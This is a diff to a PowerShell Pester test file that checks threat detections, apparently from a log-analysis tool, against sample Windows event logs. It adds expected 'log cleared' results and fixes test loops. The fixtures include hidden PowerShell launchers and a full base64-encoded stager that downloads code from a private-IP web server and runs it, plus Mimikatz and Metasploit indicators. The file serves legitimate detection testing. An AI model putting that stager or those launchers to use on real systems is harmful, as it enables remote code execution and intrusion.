@@ -58,6 +58,13 @@ Describe 'Testing Sample EVTX files' {
                     EventID = [int]7040
                     Message = 'Event Log Service Started'
                     Results = "Service name: Windows Event Log`nSelective event log manipulation may precede this event."
+                },
+                [PSCustomObject]@{
+                    Date    = [datetime]636920030723739942
+                    Log     = 'System'
+                    EventID = [int]104
+                    Message = 'A Log was cleared'
+                    Results = "The log 'System' was cleared by user DESKTOP-JR78RLP\jwrig"
                 }
             )
         }
@@ -164,6 +171,15 @@ Describe 'Testing Sample EVTX files' {
                     Results="Service name: KgXItsbKgTJzdzwl`nMetasploit-style %SYSTEMROOT% image path (possible use of Metasploit Native upload exploit payload)`n"
                     Command='%SYSTEMROOT%\duKhLYUX.exe'
                     Decoded=''
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636100332625429687 # 2016-09-21 05:41:02Z
+                    Log='System'
+                    EventID=[int]104
+                    Message='A Log was cleared'
+                    Results="The log 'System' was cleared by user IE10WIN7\IEUser"
+                    Command=''
+                    Decoded=''
                 }
             )
         }
@@ -223,6 +239,15 @@ Describe 'Testing Sample EVTX files' {
                     EventID=[int]4688
                     Message='Suspicious Command Line'
                     Results="Long Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636099933466054687 # 2016-09-20 18:35:46Z
+                    Log='Security'
+                    EventID=[int]1102
+                    Message='Audit Log Clear'
+                    Results='The Audit log was cleared by IE10WIN7\IEUser'
+                    Command=''
+                    Decoded=''
                 }
             )
         }
@@ -245,8 +270,8 @@ Describe 'Testing Sample EVTX files' {
             }
             $i++
         }
-        $i=1
-        $r | Select-Object -Skip 1 | ForEach-Object {
+        #$i=1
+        $r[1..$($r.Count-2)] | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
                 $o.Command -match 'powershell\.exe'| Should -Be $true
@@ -292,6 +317,13 @@ Describe 'Testing Sample EVTX files' {
                     Results="Service name: UWdKhYTIQWWJxHfx`nLong Command Line: greater than 1000 bytes`nMetasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)`n500+ consecutive Base64 characters`nBase64-encoded and compressed function"
                     Command='%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden'
                     Decoded='function h4ZcoQgeeU {'
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636099933465908203 # 2016-09-20 18:35:46Z
+                    Log='System'
+                    EventID=[int]104
+                    Message='A Log was cleared'
+                    Results="The log 'System' was cleared by user IE10WIN7\IEUser"
                 }
             )
         }
@@ -315,7 +347,7 @@ Describe 'Testing Sample EVTX files' {
             $i++
         }
         $i=1
-        $r | Select-Object -Skip 1 | ForEach-Object {
+        $r[1..($r.Count -2)] | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
                 $o.Command -match 'powershell\.exe'| Should -Be $true
@@ -360,6 +392,13 @@ Describe 'Testing Sample EVTX files' {
                     EventID=[int]4673
                     Message='Sensititive Privilege Use Exceeds Threshold'
                     Results="Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.`nUsername: Sec504`nDomain Name: SEC504STUDENT"
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636922517091380587 # 2019-04-30 20:08:29Z
+                    Log='Security'
+                    EventID=[int]1102
+                    Message='Audit Log Clear'
+                    Results="The Audit log was cleared by SEC504STUDENT\Sec504"
                 }
             )
         }
@@ -624,6 +663,14 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AQgBKAEUAQ
                     Command=@'
 powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMAZQBQAG8AaQBOAFQATQBBAE4AYQBHAEUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAG8AbgBUAGkAbgB1AEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgBDAGwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAHgAeQAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBSAGUAcQB1AEUAUwB0AF0AOgA6AEQAZQBmAGEAdQBMAFQAVwBlAEIAUABSAG8AeAB5ADsAJABXAGMALgBQAFIATwB4AFkALgBDAFIARQBEAGUATgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4AZQB0AC4AQwByAGUARABlAG4AdABJAEEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQBVAEwAVABOAGUAVAB3AG8AcgBrAEMAcgBFAEQAZQBuAFQASQBhAEwAcwA7ACQASwA9ACcAcwB5AHwAUgA0AFgAaABCAFcAbwB6AEsALgB4AC0ANgArADkAPgBJAGkAcQA3AEQAOABgAEoATABuAGwAdwBWACcAOwAkAEkAPQAwADsAWwBDAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AGMALgBEAE8AdwBuAGwAbwBhAEQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQA0ADkAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUAbgBnAHQAaABdAH0AOwBJAEUAWAAgACgAJABCAC0ASgBPAEkATgAnACcAKQA=
 '@
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636100029541289062 # 2016-09-20 21:15:54Z
+                    Log='Security'
+                    EventID=[int]1102
+                    Message='Audit Log Clear'
+                    Results='The Audit log was cleared by IE10WIN7\IEUser'
+                    Command=''
                 }
             )
         }
@@ -647,7 +694,7 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             $i++
         }
         $i = 0
-        $r | ForEach-Object {
+        $r[0..($r.Count -2)] | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
                 $o.Command -match 'powershell\.exe'| Should -Be $true
@@ -673,6 +720,7 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             It "Test result $($i) Decoded" {
                 $o.Decoded -match '-[bB]?[x|X][oO][rR]'| Should -Be $true
             }
+            $i++
         }
     }
     Context 'powersploit-system' {
@@ -703,6 +751,13 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
                     EventID=[int]4688
                     Message='Suspicious Command Line'
                     Results="Download via Net.WebClient DownloadString`nCommand referencing Mimikatz`nPowerSploit Invoke-M`imikatz.ps1`nUse of PowerSploit`n"
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636100011244082031 # 2016-09-20 20:45:24Z
+                    Log='Security'
+                    EventID=[int]1102
+                    Message='Audit Log Clear'
+                    Results="The Audit log was cleared by IE10WIN7\IEUser"
                 }
             )
         }
@@ -726,7 +781,7 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             $i++
         }
         $i = 0
-        $r | ForEach-Object {
+        $r[0..($r.Count - 2)] | ForEach-Object {
             $o = $_
             It "Test result $($i) Command" {
                 $o.Command -match 'powershell\.exe'| Should -Be $true
@@ -737,6 +792,7 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             It "Test result $($i) Command" {
                 $o.Command -match 'Mimikatz'| Should -Be $true
             }
+            $i++
         }
     }
     Context 'psattack-security' {
@@ -808,6 +864,14 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
                     Message='Suspicious Command Line'
                     Results="Use of C Sharp compiler csc.exe`nPSAttack-style command via csc.exe`n"
                     Command='"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"'
+                },
+                [PSCustomObject]@{
+                    Date=[datetime]636100000649433593 # 2016-09-20 20:27:44Z
+                    Log='Security'
+                    EventID=[int]1102
+                    Message='Audit Log Clear'
+                    Results="The Audit log was cleared by IE10WIN7\IEUser"
+                    Command=''
                 }
             )
         }
